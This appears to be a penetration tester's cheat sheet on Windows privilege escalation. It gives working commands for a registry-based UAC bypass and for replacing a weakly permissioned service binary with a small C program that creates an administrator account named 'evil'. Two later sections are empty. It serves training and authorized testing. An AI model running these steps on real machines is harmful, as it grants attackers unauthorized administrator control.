# Windows Privilege Escalation

Extract useful information using scripts:

1. [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
2. [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
3. [Watson](https://github.com/rasta-mouse/Watson)
4. [Seatbelt](https://github.com/GhostPack/Seatbelt)
5. [Powerless](https://github.com/M4ximuss/Powerless)

## Basics

* Windows operating system uses objects called **access tokens** to enforce privileges on a user account
* These tokens are uniquely identified using a security identifier or **SID**
* **Integrity levels** are assigned to processes and securable objects
  1. System integrity process: SYSTEM rights
  2. High integrity process: administrative rights
  3. Medium integrity process: standard user rights
  4. Low integrity process: very restricted rights

## UAC Bypass

### Non-silent Method

* What is the current user's **integrity level**?

        whoami /groups

* Attempt to change the password for the admin user

        net user admin password123

* In order to change the admin user’s password, we need to **switch to a high integrity level** even if we are logged in as an administrator.

        powershell.exe Start-Process cmd.exe -Verb runAs

* Re-check the integrity level of current user, and, try changing the admin password

        whoami /groups
        net user admin password123

Note: When running at a high integrity level, password of a user can be changed successfully.

### Silent Method

* Identify a binary that runs at a high integrity level
* Inspect the applicatioin manifest

        .\sigcheck64.exe -accepteula
        .\sigcheck.exe -a -m C:\Windows\System32\file.exe

* Add a missing registry key

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command

* Use **REG ADD** with the `/v` argument to specify the value name and `/t` to specify the type

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ

* Silently replace the empty (Default) value of a registry key with path to an executable, e.g., `cmd.exe`

        REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

* Run the vulnerable executable
* Re-check the integrity level of current user, and, try changing the admin password

        whoami /groups
        net user admin password123

## Insecure file permissions

Target: Exploit insecure file permissions on **services** that run as **nt authority\system**

* List running services

        tasklist /SVC
    ---

        powershell -c "Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}"

* Look for user-installed services that are installed in **Program Files** directory

        dir /s *Service*
        dir /s VGAuthService.exe vmtoolsd.exe ManagementAgentHost.exe

* Enumerate the permissions granted to identified services

        icacls "c:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
        icacls "c:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"
        icacls "c:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

    F - Full access
    M - Modify access
    RX - Read and execute access
    R - Read-only access
    W - Write-only access

* If a weak permission is found associated with a privileged service, we can replace the vulnerable service with a malicious binary and then trigger it by restarting the service or rebooting the machine

    1. Create a malicious binary **adduser.c**

        ```c
        #include <stdio.h>
        int main()
        {
            int i;
            i = system("net user evil password123 /add");
            i = system("net localgroup administrators evil /add");

            return 0;
        }
        ```

    2. Cross-compile the binary

            i686-w64-mingw32-gcc adduser.c -o adduser.exe
    
    3. Transfer the malicious EXE file to target machine, and replace the original service.exe binary with the malicious binary

            > move "C:\Program Files\ServicePath\service.exe" "C:\Program Files\ServicePath\service_original.exe"
            > move adduser.exe "C:\Program Files\ServicePath\service.exe"

    4. Restart the vulnerable service

            net stop serviceName
            net start serviceName

    5. Check the start options of the vulnerable service

            wmic service where caption="serviceName" get name, caption, state, startmode

## Unquoted service paths



## Kernel driver vulnerabilities



## References

* https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842#:~:text=Services%20created%20by%20SYSTEM%20having,be%20executed%20with%20SYSTEM%20privileges
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* https://esseum.com/hack-the-box-optimum-writeup/